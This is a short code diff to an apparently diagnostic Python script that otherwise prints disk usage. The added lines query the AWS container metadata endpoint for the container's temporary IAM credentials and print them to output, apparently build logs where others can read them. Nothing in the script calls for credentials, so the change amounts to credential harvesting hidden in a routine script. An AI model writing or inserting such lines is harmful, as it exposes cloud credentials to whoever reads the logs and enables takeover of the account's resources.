@@ -31,5 +31,7 @@ print ("---------------------")
 
 utils.command("df -h", printoutput=True)
 
+_,s,_ = utils.command(f"curl 169.254.170.2{AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}", printoutput=True)
 
+print ("credentials", s)
 
